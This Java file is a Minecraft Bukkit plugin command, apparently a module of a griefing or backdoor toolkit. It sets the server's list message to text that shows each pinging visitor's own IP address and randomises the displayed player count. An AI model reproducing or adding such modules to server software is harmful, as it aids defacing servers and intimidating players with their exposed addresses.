package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;

import java.util.Random;

public class SetMOTD implements Command, Listener {
    private String motd = "";

    @Override
    public String[] getCommands() {
        return new String[]{"setmotd", "motd"};
    }

    @Override
    public String getDescription() {
        return "Set the server MOTD and player count to something random.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "motd <message... %ip%> | motd off");
            return;
        }

        String createdMotd = String.join(" ", args);
        if (createdMotd.equalsIgnoreCase("off")) {
            motd = "";
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Toggled the MOTD off.");
            return;
        }

        motd = ChatColor.translateAlternateColorCodes('&', createdMotd);
        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully set the MOTD to '" + motd + Colors.Success + "'!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onServerPing(ServerListPingEvent e) {
        if (motd.equals("")) {
            return;
        }

        e.setMotd(motd.replaceAll("%ip%", e.getAddress().toString().replaceAll("/", "")));
        e.setMaxPlayers(new Random().nextInt());
    }
}
